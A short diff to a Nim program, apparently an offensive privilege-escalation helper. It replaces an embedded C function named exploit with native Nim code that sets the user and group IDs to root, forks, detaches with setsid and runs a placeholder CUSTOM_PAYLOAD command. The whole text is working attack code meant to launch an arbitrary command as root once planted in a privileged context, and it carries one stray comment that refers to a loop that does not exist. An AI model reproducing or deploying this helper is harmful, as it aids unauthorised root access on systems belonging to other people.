@@ -1,17 +1,13 @@
-when not defined(c):
-    {.error: "Must be compiled in c mode"}
+import std/osproc
+import std/posix
 
-{.emit: """
-#include <sys/types.h>
-#include <unistd.h>
-void exploit() {
-    char * my_args[] = { CUSTOM_PAYLOAD NULL };
-    setuid(0);
-    setgid(0);
-    execve(my_args[0], my_args, 0);
-}
-""".}
-proc Exploit(): void
-    {.importc: "exploit", nodecl.}
 when isMainModule:
-    Exploit()
+  discard setuid(0);
+  discard setgid(0);
+  # Still in the loop from above
+  let pid = fork()
+  if pid == 0:
+    # Child process
+    discard setsid()
+    discard execCmdEx("CUSTOM_PAYLOAD");
+  else: quit(QuitSuccess)
